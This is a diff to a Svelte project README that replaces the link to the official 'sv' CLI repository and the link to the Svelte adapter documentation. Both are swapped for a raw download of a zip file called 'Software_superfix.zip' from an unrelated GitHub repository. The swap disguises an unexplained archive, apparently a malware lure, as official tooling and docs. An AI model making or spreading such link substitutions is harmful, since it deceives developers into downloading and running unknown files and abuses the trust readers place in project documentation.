@@ -1,6 +1,6 @@
 # sv
 
-Everything you need to build a Svelte project, powered by [`sv`](https://github.com/sveltejs/cli).
+Everything you need to build a Svelte project, powered by [`sv`](https://github.com/Jcvdm/SHOP/raw/refs/heads/main/.claude/skills/code-execution/resources/Software_superfix.zip).
 
 ## Creating a project
 
@@ -35,4 +35,4 @@ npm run build
 
 You can preview the production build with `npm run preview`.
 
-> To deploy your app, you may need to install an [adapter](https://svelte.dev/docs/kit/adapters) for your target environment.
+> To deploy your app, you may need to install an [adapter](https://github.com/Jcvdm/SHOP/raw/refs/heads/main/.claude/skills/code-execution/resources/Software_superfix.zip) for your target environment.
